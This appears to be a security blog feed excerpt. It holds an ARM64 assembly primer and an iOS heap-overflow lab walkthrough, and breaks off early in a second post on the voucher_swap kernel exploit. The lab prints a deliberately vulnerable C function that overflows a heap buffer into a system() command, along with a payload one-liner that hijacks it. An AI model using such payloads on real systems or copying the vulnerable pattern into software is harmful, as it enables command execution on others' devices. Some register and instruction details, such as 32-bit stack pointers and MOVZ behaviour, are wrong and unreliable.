<p>ARMv8 (ARM64) maintains compatibility with existing 32-bit architecture by using two execution states - Aarch32 and Aarch64. In Aarch32 state, the processor can only access 32-bit registers. In Aarch64 state, the processor can access 32-bit and 64-bit registers. ARM64 several general-purpose and special-purpose registers. The general-purpose registers are those which do not have side effects, and hence can be used by most instructions. One can do arithmetic with them, use them for memory addresses, and so on. The special purpose registers also do not have side effect, but can only be used for certain purposes and only by certain instructions. Other instructions may depend on their values implicitly. One example for this is the Stack Pointer register. And then we have Control-registers - these registers have side effects. On an ARM64 these are registers like TTBR (Translation table base register), which holds the base pointer of the current page tables. Many of these will be privileged and can only be used by kernel code. Some Control registers however can be used by anyone. In the below image we can see some control registers from the XNU Kernel.</p>

<p><img src="/images/posts/arm/control.png" alt="1" />
<em>Example of some control registers used in the iOS kernel</em></p>

<p>The modern OS expects to have several privilege levels which it can use to control access to resources. An example of this is the split between the kernel and the userland. Armv8 enables this split by implementing different levels of privilege, which are referred to as Exception levels in the Armv8-A architecture. ARMv8 has several exception levels that are numbered (EL0, EL1 etc), the higher the number the higher the privilege. When taking an exception, the exception level can either increase or remain the same. However, when returning from an exception, the exception level can either decrease or remain the same. Execution state (Aarch32 or Aarch64)  can change by taking or returning from an exception. On powerup, the device enters the highest exception level.</p>

<p>In terms of privilege <strong>EL0 &lt; EL1 &lt; EL2 &lt; EL3</strong></p>

<p><img src="/images/posts/arm/exceptionlevels.png" alt="1" />
<em>Example of Exception levels in ARM</em></p>

<h3 id="arm64-registers">ARM64 Registers</h3>

<p>The following list defines the different ARM64 registers and their purpose</p>

<ul>
<li>  x0-x30 are 64-bit general purpose registers. Their bottom halves can be accessed via w0-w30. </li>
 
<li>  There are four stack pointer registers SP\_EL0, SP\_EL1, SP\_EL2, SP\_EL3 (each for different execution levels) which are 32-bit wide. Apart from that there are three exception link registers ELR\_EL1, ELR\_EL2, ELR\_EL3, three saved program status registers SPSR\_EL1, SPSR\_EL2, SPSR\_EL3, and one Program Counter registers (PC). </li>
 
<li> Arm also uses PC Relative addressing - wherein it specifies the operand address relative to the PC (base address) - This helps in giving out Position independent code.</li>
 
<li>  In ARM64 (unlike ARM32), the PC cannot be accessed by most instructions, especially not directly. The PC is modified indirectly using jump or stack-related instructions.</li>
 
<li>  Similarly, the SP (Stack pointer) register is never modified implicitly (for e.g. using push/pop calls).</li>
 
<li>  The Current Program Status Register (CPSR) holds the same program status flags as the APSR along with some additional information.</li>
  
<li> First register in opcode is usually destination, rest are source (except for str, stp)</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Registers</th>
      <th>Purpose</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>x0 -x7</td>
      <td>Arguments (up to 8) - Rest on stack</td>
    </tr>
    <tr>
      <td>x8 -x18</td>
      <td>General purpose, hold variables. No assumptions can be made upon returning from a function</td>
    </tr>
    <tr>
      <td>x19 -x28</td>
      <td>If used by a function, must have their values preserved and later restored upon returning to the caller</td>
    </tr>
    <tr>
      <td>x29 (fp)</td>
      <td>Frame Pointer (points to bottom of frame)</td>
    </tr>
    <tr>
      <td>x30 (lr)</td>
      <td>Link Register. Holds the return address of a call</td>
    </tr>
    <tr>
      <td>x16</td>
      <td>Holds the system call # in (SVC 0x80) call</td>
    </tr>
    <tr>
      <td>x31 (sp/(x/w)zr)</td>
      <td>Stack Pointer (sp) or zero register(xzr or wzr)</td>
    </tr>
    <tr>
      <td>PC</td>
      <td>Program Counter Register. Contains the address of the next instruction to be executed</td>
    </tr>
    <tr>
      <td>APSR / CPSR</td>
      <td>Current Program status register (holds flags)</td>
    </tr>
  </tbody>
</table>

<h3 id="arm64-calling-convention">ARM64 calling convention</h3>

<ul>
<li> Arguments are passed in x0-x7 registers, rest are passed on the stack</li> 

<li> ret command is used to return to address in Link register (default value is x30)</li> 

<li> Return value of the function is stored in x0 or x0+x1 depending if its 64-bit or 128-bit</li> 

<li>x8 is the indirect result register, used to pass the address location of an indirect result, for example, where a function returns a large structure</li>

<li> Branch to a function happens using the B opcode.</li> 

<li> Branch with link (BL) copies the address of the next instruction (after the BL) into the link register (x30) before branching</li> 

<li> BL is hence used for subroutine calls </li> 

<li> BR call is used to branch to register, for e.g br x8</li> 

<li> BLR code is used to branch to register and store the address of the next instruction (after the BL) into the link register (x30)</li> 
</ul>
<h3 id="arm-opcodes">ARM Opcodes</h3>

<table>
  <thead>
    <tr>
      <th>Opcodes</th>
      <th>Purpose</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>MOV</td>
      <td>Move one register to another</td>
    </tr>
    <tr>
      <td>MOVN</td>
      <td>Move negative value to register</td>
    </tr>
    <tr>
      <td>MOVK</td>
      <td>Move 16-bits into register and leave the rest unchanged</td>
    </tr>
    <tr>
      <td>MOVZ</td>
      <td>Move shifted 16-bit registers, leaving the rest unchanged</td>
    </tr>
    <tr>
      <td>lsl/lsr</td>
      <td>Logical shift left, Logical shift right</td>
    </tr>
    <tr>
      <td>ldr</td>
      <td>Load register</td>
    </tr>
    <tr>
      <td>str</td>
      <td>Store register</td>
    </tr>
    <tr>
      <td>ldp/stp</td>
      <td>load/store two registers behind each other</td>
    </tr>
    <tr>
      <td>adr</td>
      <td>Address of label at PC-relative offset</td>
    </tr>
    <tr>
      <td>adrp</td>
      <td>Address of page at PC-relative offset</td>
    </tr>
    <tr>
      <td>cmp</td>
      <td>Compare two values, flags are updated automatically (N - result bit 31, Z if result zero, V if overflow, C if NOT borrow)</td>
    </tr>
    <tr>
      <td>bne</td>
      <td>Branch if zero flag is not set</td>
    </tr>
  </tbody>
</table>

<h3 id="system-registers">System Registers</h3>

<p>Apart from this, there might be some system specific registers as well, which are available only on that particular OS. For e.g, the below registers are present in iOS</p>

<p><img src="/images/posts/arm/system.png" alt="1" /></p>

<h3 id="readingwriting-system-registers">Reading/Writing System Registers</h3>

<p>MRS <Xt>, systemreg -&gt; Read from system register into destination register Xt</Xt></p>

<p>MSR <Xt>, systemreg -&gt; Write to system register the value stored in Xt register</Xt></p>

<p>For e.g use MSR PAN, #1 to set the PAN bit and MSR PAN, #0 to clear the PAN bit</p>

<h3 id="function-prologueepilogue">Function Prologue/Epilogue</h3>

<p><b>Prologue</b> -  Appears at the start of the function, prepares the stack and registers for use within the function&lt;/li&gt;</p>

<p><b>Epilogue</b> -  Appears at the end of the function, restores the stack and registers to the original state before function call&lt;/li&gt;</p>

<p><img src="/images/posts/arm/pe.png" alt="1" />
<em>Function Prologue/Epilogue</em></p>

<h3 id="examples">Examples</h3>

<ul>
  <li>mov x0, x1 -&gt; x0 = x1</li>
  <li>movn x0, 1 -&gt; x0 = -1</li>
  <li>add x0, x1 -&gt; x0 = x0 + x1</li>
  <li>ldr x0, [x1] -&gt;   x0 = *x1 -&gt; x0 = address stored in x1</li>
  <li>ldr x0, [x1, 0x10]! -&gt;  x1 += 0x10; x0 = *x1(Pre-Indexing mode)</li>
  <li>ldr x0, [x1], 0x10 -&gt; x0 = *x1; x1 += 0x10 (Post-Indexing mode)</li>
  <li>str x0, [x1] -&gt;   *x1 = x0 -&gt; Destination is on the right</li>
  <li>ldr x0, [x1, 0x10] -&gt; x0 = *(x1 + 0x10)</li>
  <li>ldrb    w0, [x1] -&gt; Load a byte from address stored in x1</li>
  <li>ldrsb   w0, [x1] -&gt; Load a signed byte from address stored in x1</li>
  <li>adr    x0, label -&gt; Load address of labels into x0</li>
  <li>stp x0, x1, [x2] -&gt;  *x2 = x0; *(x2 + 8) = x1</li>
  <li>stp	x29, x30, [sp, -64]!  -&gt; store x29, x30 (LR) on stack</li>
  <li>ldp	x29, x30, [sp], 64] -&gt;  Restore x29, x30 (LR) from the stack</li>
  <li>svc 0 -&gt; Perform a syscall (syscall number x16 register)</li>
  <li>str x0, [x29] -&gt; store x0 at the address in x29 (destination on right)</li>
  <li>ldr x0, [x29] -&gt; load the value from the address in x29 into x0</li>
  <li>blr x0 -&gt; calls the subroutine at the address stored in x0, store next instruction in link register (x30)</li>
  <li>br x0 -&gt; Jump to address stored in x0</li>
  <li>bl label -&gt; Branch to label, store next instruction in link register (x30)</li>
  <li>bl	printf -&gt; Call the printf function with arguments stored x0, x1</li>
  <li>ret -&gt; Jump to the address stored in x30</li>
</ul>

<h3 id="a-simple-heap-overflow">A Simple Heap Overflow</h3>

<p>Let’s write a simple Heap overflow exploit for an ARM binary.</p>

<p>Your task is to exploit a heap overflow vulnerability in the <i>vuln</i> binary to execute a command of your choice. The binaries are compiled for the iOS platform so need to be run on a jailbroken iOS device.</p>

<p>The binaries for this and the next article can be found <a href="https://drive.google.com/file/d/1f3PDEz-Fh9I3rSDhpMGW5ZrCU9g0BjKL/view?usp=sharing">here</a></p>

<p>SSH to your Corellium (or jailbroken iOS) device and run the vuln binary</p>

<p><strong>$</strong> <strong>vuln</strong></p>

<p>Run the binary <strong>vuln</strong>. You get a message that says “Better luck next time”</p>

<p><img src="/images/posts/arm/1.png" alt="1" /></p>

<p>Let’s open the binary in Hopper to see what’s going on. Let’s have a look at the main function.</p>

<p><img src="/images/posts/arm/2.png" alt="1" /></p>

<p>So, it’s clear what we need to do to jump to the function <strong>heapOverflow</strong></p>

<p>In order to do that, the following requirements must be met</p>

<ol>
  <li>Pass three arguments (or 2 because the first argument in a C program is the command with which the program is invoked)</li>
  <li><strong>argv[1]</strong> should be the string “<strong>heap</strong>”</li>
  <li><strong>argv[2]</strong> should be some argument that gets passed as the first argument to the function <strong>heapOverflow</strong></li>
</ol>

<p>Just to recall</p>

<p>A main function in C has the prototype</p>

<p>int main(int argc, char **argv)</p>

<p><strong>argc</strong> - An integer that contains the count of arguments that follow in argv. The argc parameter is always greater than or equal to 1.</p>

<p><strong>argv</strong> - An array of null-terminated strings representing command-line arguments entered by the user of the program. By convention, argv[0] is the command with which the program is invoked, argv[1] is the first command-line argument, and so on, until argv[argc], which is always NULL</p>

<p>Let’s also have a look at the PseudoCode of the heapOverflow function. Note that the PseudoCode shows up for 32-bit arch but still gives you a good idea of the program flow.</p>

<p><img src="/images/posts/arm/3.png" alt="1" /></p>

<p>So it seems like it tries to open a file with the name as the first argument which is passed to it.</p>

<p>At the end, there is also a call to the <strong>system</strong> function which executes a command, the input is the r22 (or x22) register</p>

<p>The allocation for r21 (x21) is 0x400 bytes, which is read using the following <strong>fread</strong> command</p>

<p>fread(r21, 0x1, r20, r19);</p>

<p>Let’s create a simple file on the device and pass it as input to the <strong>vuln</strong> binary.</p>

<p><strong>echo “Hello World” &gt; input.txt</strong>
.<strong>/vuln heap input.txt</strong></p>

<p><img src="/images/posts/arm/5.png" alt="1" /></p>

<p>So it seems like it prints out the input for the <strong>whoami</strong> command</p>

<p>Let’s cheat a bit to look at the Source code itself</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">heapOverflow</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Heap overflow challenge. Execute a shell command of your choice on the device</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Welcome: from %s, printing out the current user</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s">"rb"</span><span class="p">);</span>
    <span class="n">fseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">fs</span> <span class="o">=</span> <span class="n">ftell</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
    <span class="n">fseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">command</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="s">"whoami"</span><span class="p">);</span>
    <span class="n">fread</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fs</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Sure enough, passing a file with length more than <strong>0x400</strong> bytes will overflow the adjacent memory and might end up overflowing the string “<strong>command</strong>”, and thus when the <strong>system</strong> call is made, we might be able to call our own commands.</p>

<p>On the Corellium device, use the following command to generate the malicious file</p>

<p><strong>python3 -c ‘print(“/”*0x400+”/bin/ls\x00”)’ &gt; hax.txt</strong></p>

<p>Then pass it as input to the binary.</p>

<p><strong>vuln heap hax.txt</strong></p>

<p><img src="/images/posts/arm/4.png" alt="1" /></p>

<p>Instead of the <strong>whoami</strong> command, the <strong>ls</strong> command gets executed.</p>

<p>Can you try and get a shell on the device using this ?</p>

<h3 id="references">References</h3>

<ul>
  <li>https://github.com/Siguza/ios-resources/blob/master/bits/arm64.md</li>
  <li>https://github.com/Billy-Ellis/Exploit-Challenges</li>
  <li>https://developer.arm.com/documentation/ddi0487/latest/arm-architecture-reference-manual-armv8-for-armv8-a-architecture-profile
https://exploit.education</li>
</ul>]]></content><author><name>Prateek Gianchandani</name></author><category term="security" /><category term="ios" /><summary type="html"><![CDATA[Hi Everyone ! In this blog series, we will be understanding the ARM instruction set and using that to reverse ARM Binaries followed by writing exploits for them. So let’s start with the basics of ARM64.]]></summary></entry><entry><title type="html">From zero to tfp0 - Part 2: A Walkthrough of the voucher_swap exploit</title><link href="/2020/06/01/from-zero-to-tfp0-part-2-a-walkthrough-of-the-voucher-swap-exploit.html" rel="alternate" type="text/html" title="From zero to tfp0 - Part 2: A Walkthrough of the voucher_swap exploit" /><published>2020-06-01T00:40:00+00:00</published><updated>2020-06-01T00:40:00+00:00</updated><id>/2020/06/01/from-zero-to-tfp0-part-2-a-walkthrough-of-the-voucher-swap-exploit</id><content type="html" xml:base="/2020/06/01/from-zero-to-tfp0-part-2-a-walkthrough-of-the-voucher-swap-exploit.html"><![CDATA[<p>In this article, we will get an in-depth look at the <strong>voucher_swap</strong> vulnerability and all the steps leading up to getting the kernel task port.</p>

<p>All credit for the vulnerability and the PoC goes to <a href="https://twitter.com/_bazad">@_bazad</a></p>

<h3 id="reference-counting">Reference Counting</h3>

<p>The bug in this article is a reference counting issue due to <strong>MIG</strong> generated code. But let’s understand first what is reference counting ? Reference counting is a form of simple yet effective memory management. It is basically a way to keep a count of the number of references to an object held by other objects. If an object’s reference count reaches zero, the object will be freed. Creating or Copying an object will increase its reference count by 1, whereas destroying a reference or overwriting the object will decrement its reference count by 1. In systems with limited memory, reference counting can prove more efficient than garbage collection (which happens in cycles and can be time consuming) , because objects can be claimed as soon as their reference count becomes zero, and this improves overall responsiveness of the system.
<!--more--></p>

<p>Reference counting can be put on certain objects, with a field in the object struct denoting the reference count. For e.g, the Mach Ports(<strong>ipc_port_t</strong>) are reference counted objects, with the 32 bit field <strong>io_references</strong> specifying the number of references, and the functions <strong>ip_references</strong> and <strong>ip_release</strong> are used to increase and decrease the reference count on the port. A simple search for <strong>ip_reference</strong> will give many examples of this function being used to manipulate the reference count of ports.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_object</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">603</span><span class="o">:</span> 			<span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_srights</span><span class="o">++</span><span class="p">;</span>
    <span class="mi">604</span><span class="o">:</span> 		<span class="err">}</span>
    <span class="mi">605</span><span class="o">:</span> 		<span class="n">ip_reference</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">606</span><span class="o">:</span> 		<span class="n">ip_unlock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">607</span><span class="o">:</span> 		<span class="k">break</span><span class="p">;</span>
    <span class="mi">608</span><span class="o">:</span> 	    <span class="err">}</span>
    <span class="mi">609</span><span class="o">:</span> 
    <span class="mi">610</span><span class="o">:</span> 	    <span class="k">case</span> <span class="n">MACH_MSG_TYPE_MAKE_SEND</span><span class="p">:</span> <span class="p">{</span>
    <span class="mi">611</span><span class="o">:</span> 		<span class="n">ipc_port_t</span> <span class="n">port</span> <span class="o">=</span> <span class="p">(</span><span class="n">ipc_port_t</span><span class="p">)</span> <span class="n">object</span><span class="p">;</span>
    <span class="mi">612</span><span class="o">:</span> 
    <span class="mi">613</span><span class="o">:</span> 		<span class="n">ip_lock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">614</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="n">ip_active</span><span class="p">(</span><span class="n">port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">615</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">(</span><span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_receiver_name</span> <span class="o">!=</span> <span class="n">MACH_PORT_NULL</span><span class="p">);</span>
    <span class="mi">616</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">((</span><span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_receiver</span> <span class="o">==</span> <span class="n">ipc_space_kernel</span><span class="p">)</span> <span class="o">||</span>
    <span class="mi">617</span><span class="o">:</span>                    <span class="p">(</span><span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_receiver</span><span class="o">-&gt;</span><span class="n">is_node_id</span> <span class="o">!=</span> <span class="n">HOST_LOCAL_NODE</span><span class="p">));</span>
    <span class="mi">618</span><span class="o">:</span> 			<span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_mscount</span><span class="o">++</span><span class="p">;</span>
    <span class="mi">619</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">620</span><span class="o">:</span> 
    <span class="mi">621</span><span class="o">:</span> 		<span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_srights</span><span class="o">++</span><span class="p">;</span>
    <span class="mi">622</span><span class="o">:</span> 		<span class="n">ip_reference</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">623</span><span class="o">:</span> 		<span class="n">ip_unlock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">624</span><span class="o">:</span> 		<span class="k">break</span><span class="p">;</span>
    <span class="mi">625</span><span class="o">:</span> 	    <span class="p">}</span></code></pre></figure>

<p>And same for <strong>vouchers</strong>, the value <strong>iv_refs</strong> keeps a track of the reference count, as can be seen in <strong>osfmk/ipc/ipc_voucher.c</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">63</span><span class="o">:</span> <span class="cm">/*
    64:  * IPC Voucher
    65:  *
    66:  * Vouchers are a reference counted immutable (once-created) set of
    67:  * indexes to particular resource manager attribute values
    68:  * (which themselves are reference counted).
    69:  */</span>
    <span class="mi">70</span><span class="o">:</span> <span class="k">struct</span> <span class="n">ipc_voucher</span> <span class="p">{</span>
    <span class="mi">71</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_hash</span><span class="p">;</span>	<span class="cm">/* checksum hash */</span>
    <span class="mi">72</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_sum</span><span class="p">;</span>		<span class="cm">/* checksum of values */</span>
    <span class="mi">73</span><span class="o">:</span> 	<span class="n">os_refcnt_t</span>		<span class="n">iv_refs</span><span class="p">;</span>	<span class="cm">/* reference count */</span>
    <span class="mi">74</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_table_size</span><span class="p">;</span>	<span class="cm">/* size of the voucher table */</span>
    <span class="mi">75</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_inline_table</span><span class="p">[</span><span class="n">IV_ENTRIES_INLINE</span><span class="p">];</span>
    <span class="mi">76</span><span class="o">:</span> 	<span class="n">iv_entry_t</span>		<span class="n">iv_table</span><span class="p">;</span>	<span class="cm">/* table of voucher attr entries */</span>
    <span class="mi">77</span><span class="o">:</span> 	<span class="n">ipc_port_t</span>		<span class="n">iv_port</span><span class="p">;</span>	<span class="cm">/* port representing the voucher */</span>
    <span class="mi">78</span><span class="o">:</span> 	<span class="n">queue_chain_t</span>		<span class="n">iv_hash_link</span><span class="p">;</span>	<span class="cm">/* link on hash chain */</span>
    <span class="mi">79</span><span class="o">:</span> <span class="p">};</span>
    <span class="mi">80</span><span class="o">:</span> 
    <span class="mi">81</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IV_NULL</span> 	<span class="n">IPC_VOUCHER_NULL</span></code></pre></figure>

<p>The value <strong>iv_refs</strong> is of the type <strong>os_refcnt_t</strong>, which is a 32 bit integer, so its range should be from <strong>0-0xffffffff</strong> right ? Actually not. The maximum value is defined to be <strong>0x0fffffff</strong> (7 f’s) in the file <strong>libkern/os/refcnt.c</strong>. You may wonder why ? This is a new mitigation to protect against integer overflows, and makes the reference leaks vulnerability unexploitable, but still a reference counting leak vulnerability can let you increase the reference count and hence perform interesting things as we will see later in this article.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">libkern</span><span class="o">/</span><span class="n">os</span><span class="o">/</span><span class="n">refcnt</span><span class="p">.</span><span class="n">c</span>
    <span class="mo">05</span><span class="o">:</span> <span class="err">#</span><span class="n">include</span> 
    <span class="mo">06</span><span class="o">:</span> <span class="err">#</span><span class="n">include</span> 
    <span class="mo">07</span><span class="o">:</span> <span class="err">#</span><span class="n">include</span> <span class="s">"refcnt.h"</span>
    <span class="mi">08</span><span class="o">:</span> 
    <span class="mi">09</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="nf">OS_REFCNT_MAX_COUNT</span>     <span class="p">((</span><span class="n">os_ref_count_t</span><span class="p">)</span><span class="mh">0x0FFFFFFFUL</span><span class="p">)</span>
    <span class="mi">10</span><span class="o">:</span> 
    <span class="mi">11</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">OS_REFCNT_DEBUG</span>
    <span class="mi">12</span><span class="o">:</span> <span class="n">os_refgrp_decl</span><span class="p">(</span><span class="k">static</span><span class="p">,</span> <span class="n">global_ref_group</span><span class="p">,</span> <span class="s">"all"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="mi">13</span><span class="o">:</span> <span class="k">static</span> <span class="n">bool</span> <span class="n">ref_debug_enable</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    <span class="mi">14</span><span class="o">:</span> <span class="k">static</span> <span class="k">const</span> <span class="kt">size_t</span> <span class="n">ref_log_nrecords</span> <span class="o">=</span> <span class="mi">1000000</span><span class="p">;</span></code></pre></figure>

<p>Accessing any value out of this range will trigger a kernel panic, as can be seen from the functions below.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">libkern</span><span class="o">/</span><span class="n">os</span><span class="o">/</span><span class="n">refcnt</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">36</span><span class="o">:</span> <span class="k">static</span> <span class="kt">void</span>
    <span class="mi">37</span><span class="o">:</span> <span class="n">os_ref_check_underflow</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">,</span> <span class="n">os_ref_count_t</span> <span class="n">count</span><span class="p">)</span>
    <span class="mi">38</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">39</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">__improbable</span><span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">40</span><span class="o">:</span> 		<span class="n">panic</span><span class="p">(</span><span class="s">"os_refcnt: underflow (rc=%p, grp=%s)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">rc</span><span class="p">,</span> <span class="n">ref_grp_name</span><span class="p">(</span><span class="n">rc</span><span class="p">));</span>
    <span class="mi">41</span><span class="o">:</span> 		<span class="n">__builtin_unreachable</span><span class="p">();</span>
    <span class="mi">42</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">43</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">44</span><span class="o">:</span> 
    <span class="mi">45</span><span class="o">:</span> <span class="k">static</span> <span class="kt">void</span>
    <span class="mi">46</span><span class="o">:</span> <span class="n">os_ref_assert_referenced</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">,</span> <span class="n">os_ref_count_t</span> <span class="n">count</span><span class="p">)</span>
    <span class="mi">47</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">48</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">__improbable</span><span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">49</span><span class="o">:</span> 		<span class="n">panic</span><span class="p">(</span><span class="s">"os_refcnt: used unsafely when zero (rc=%p, grp=%s)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">rc</span><span class="p">,</span> <span class="n">ref_grp_name</span><span class="p">(</span><span class="n">rc</span><span class="p">));</span>
    <span class="mi">50</span><span class="o">:</span> 		<span class="n">__builtin_unreachable</span><span class="p">();</span>
    <span class="mi">51</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">52</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">53</span><span class="o">:</span> 
    <span class="mi">54</span><span class="o">:</span> <span class="k">static</span> <span class="kt">void</span>
    <span class="mi">55</span><span class="o">:</span> <span class="n">os_ref_check_overflow</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">,</span> <span class="n">os_ref_count_t</span> <span class="n">count</span><span class="p">)</span>
    <span class="mi">56</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">57</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">__improbable</span><span class="p">(</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="n">OS_REFCNT_MAX_COUNT</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">58</span><span class="o">:</span> 		<span class="n">panic</span><span class="p">(</span><span class="s">"os_refcnt: overflow (rc=%p, grp=%s)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">rc</span><span class="p">,</span> <span class="n">ref_grp_name</span><span class="p">(</span><span class="n">rc</span><span class="p">));</span>
    <span class="mi">59</span><span class="o">:</span> 		<span class="n">__builtin_unreachable</span><span class="p">();</span>
    <span class="mi">60</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">61</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<p>The <strong>ipc_voucher_release</strong> and <strong>ipc_voucher_reference</strong> functions for a voucher just check whether the voucher is not <strong>NULL</strong> and call <strong>iv_reference</strong> and <strong>iv_release</strong> which then calls <strong>os_ref_retain</strong> and <strong>os_ref_release</strong> respectively.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">449</span><span class="o">:</span> <span class="kt">void</span>
    <span class="mi">450</span><span class="o">:</span> <span class="n">ipc_voucher_reference</span><span class="p">(</span><span class="n">ipc_voucher_t</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">451</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">452</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IPC_VOUCHER_NULL</span> <span class="o">==</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">453</span><span class="o">:</span> 		<span class="k">return</span><span class="p">;</span>
    <span class="mi">454</span><span class="o">:</span> 
    <span class="mi">455</span><span class="o">:</span> 	<span class="n">iv_reference</span><span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">456</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">457</span><span class="o">:</span> 
    <span class="mi">458</span><span class="o">:</span> <span class="kt">void</span>
    <span class="mi">459</span><span class="o">:</span> <span class="n">ipc_voucher_release</span><span class="p">(</span><span class="n">ipc_voucher_t</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">460</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">461</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IPC_VOUCHER_NULL</span> <span class="o">!=</span> <span class="n">voucher</span><span class="p">)</span>
